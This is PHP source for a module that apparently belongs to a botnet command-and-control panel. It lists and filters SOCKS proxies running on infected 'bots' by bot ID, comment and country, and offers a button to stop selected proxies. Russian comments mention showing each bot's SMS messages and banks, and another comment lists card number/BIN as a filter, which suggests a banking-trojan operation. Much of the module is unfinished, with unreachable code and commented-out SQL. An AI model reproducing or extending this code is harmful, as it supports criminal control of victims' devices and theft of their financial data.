<?php
require_once "cmd_mod.php";

class socks extends modBase
{
	protected $module_name = 'socks';

	function get_countries(){
		$html = "<div class='col-md-1'><select class='form-control' id='socks-filter-bot_country ><option value='all'>All</option>";

		$sql = "select distinct country from bots order by country";

		$rows = $this->db->exec($sql, null, true);

		foreach ($rows as $row) {
			$html .= "<option value='{$row[country]}'>{$row[country]}</option>";
		}

		$html .= "</select></div>";

		return $html;
	}

	function get_filter()
	{

		$country_html = <<<PHP

	<div class="col-md-2 tagsinput-primary">
		<input id="socks-filter-bot_country" type="text" pattern=".{2}" placeholder="Country codes" 
			class="form-control tagsinput" value="" title="Use comma for multiply values: 1,2,3" data-role="tagsinput" />
	</div>
PHP;


		$fields = array(
			array('bot_id', 'Bot ID', 'Bot ID', modBase::$filters['bot_id']),
			array('bot_comment', 'Bot comment', 'Bot comment'),
			array('bot_country', $country_html, 'us', '.*'),
		);
		
		// bot id, bot comment, country list, CC number/bin, only online bots
		return $this->build_filter($fields);
	}
	
	function get_content()
	{
		
		$content = "<div class='row'>
			<div class='col-md-12' style='font-size: 32pt; text-align: center'>
				<span class='glyphicon glyphicon-globe marginRight10' aria-hidden='true'></span>
				Socks</div>
		</div>
		<div>&nbsp;</div>
		<div><center><h4>Under construction</h4></center></div>";
		
		return $this->wrap_content("", $content);
		
		
		// показывать статус бота кружок --------------------------------- НЕ ЗАБЫВАЙ УБИРАТЬ ВСЕ СТАРОЕ ДЕРЬМО
		// кнопки ПОказать смс бота, его банки, страницу деталей бота - все в новом окне
		// $content = 'socks TODO'; //$this->get_table($rows, $headers, 'textcenter');
		// $total_rows = 500;
		
		$bot_id = hlp::get($this->filter_values, 'bot_id', '');
		$bot_comment = hlp::get($this->filter_values, 'bot_comment', '');
		$bot_country = hlp::get($this->filter_values, 'bot_country', '');


// TODO переделать на addWhere(), подробнее в contacts.php

		//~ $where_fields = array();
//~ 
		//~ if ($bot_id){
			//~ $where_fields[] = " bot_id = {$this->db->quote($bot_id)} ";
		//~ }
		//~ if ($bot_comment){
			//~ $where_fields[] = " comment like {$this->db->quote('%' . $bot_comment . '%')} ";
		//~ }
		//~ if ($bot_country){
			//~ $countries = explode(',', $this->db->quote($bot_country));
//~ 
			//~ $where_fields[] = " country in (".implode("','", $countries).") ";
		//~ }
//~ 
		//~ $where_str = '';
		//~ if (count($where_fields)){
			//~ $where_str = " where " . implode("AND", $where_fields);
		//~ }


		//~ $sql = "select * from general2.bot_socks where bot_id in (select bot_id from bots$where_str) and is_online = 1";
		//~ $sql_count = "select count(id) from general2.bot_socks where bot_id in (select bot_id from bots$where_str) and is_online = 1";

		$total_rows = $this->db->exec($sql_count, null, true)[0][0];
		$paging = $this->get_limit($total_rows, $this->results_on_page);
		$sql .= $paging['sql'];

		$headers = array();
		$headers[] = '<a href="javascript:select_all(\'input[id^=&quot;socks-table-chk-&quot;]\');undefined"><span class="fui-checkbox-checked" title="Check all"></span></a>';
		$headers[] = 'Bot ID';
		$headers[] = 'Status';


		$data = $this->db->exec($sql, null, true);
		$rows = array();
		foreach ($data as $row) {
			$tmp = array();
			$tmp[] = "<label class='checkbox' for='socks-table-chk-{$row['id']}'>
					<input type='checkbox' value='{$row['id']}' id='socks-table-chk-{$row['id']}' data-toggle='checkbox' />
				</label>";

			$tmp[] = "<a href='javascript:go_to_hash(\"bots\", {\"bot_id\": \"{$row['bot_id']}\"})'>{$row['bot_id']}</a>";
			$tmp[] = $this->replace_socks_status($row['status']);

			$rows[] = $tmp;

		}

		
		$content = $this->get_table($rows, $headers, 'textcenter');
		$buttons = array(
			array('Stop selected', 'Stop all selected items', 'show_ajax_form("panel_stop_socks")', 'danger'),
		);
		
		return $this->wrap_content("Total: {$paging['total_rows']}", $content, $paging['pages'], $buttons);
	}

	function replace_socks_status($socks_status){
	    if (isset($_SERVER["HTTP_X_FORWARDED_HOST"]))
		    $socks_status = str_replace("{{HOSTNAME}}", $_SERVER["HTTP_X_FORWARDED_HOST"], $socks_status);
		else
		    $socks_status = str_replace("{{HOSTNAME}}", $_SERVER["REMOTE_ADDR"], $socks_status);
		return $socks_status;
	}


}
